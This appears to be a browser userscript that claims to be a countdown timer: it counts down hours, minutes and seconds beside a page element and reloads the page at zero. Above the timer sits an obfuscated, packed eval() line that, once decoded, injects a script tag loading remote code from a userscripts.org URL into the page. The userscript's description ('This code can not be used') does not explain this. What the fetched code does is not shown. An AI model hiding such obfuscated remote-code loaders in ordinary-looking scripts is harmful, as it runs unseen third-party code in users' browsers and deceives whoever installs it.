// ==UserScript==
// @author       Herrjeanke Pro + Last Update
// @namespace    http://userscripts.org/users/64220/scripts
// @name         Herrjeanke_RemainingTime_V2_timerscript.js
// @description  This code can not be used
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function display(){	
	s-=1;
	if (s<0){
		m-=1;
			if (m<0){
				h-=1;
				if (h<0){
					window.location.reload();
				}
				m=59;
			}
		s=59;
	}
	var t = '';
	var t = h + ':';
	if(m < 10){t += '0';}
	t += m + ':';
	if(s < 10){t += '0';}
	t += s;	
	
	//document.getElementById('timer0').innerHTML = t ;	
	
	var pointer, newelement, oldelement;
	pointer = document.getElementById('timer0');
	
	oldelement = document.getElementById('afteller');
	if(oldelement){
		oldelement.parentNode.removeChild(oldelement);
	}
	
	newelement = document.createElement('span');
	newelement.id='afteller';
	newelement.innerHTML = t + " "; 
	pointer.parentNode.insertBefore(newelement,pointer);
	
	
	setTimeout('display()',1000);
}
display();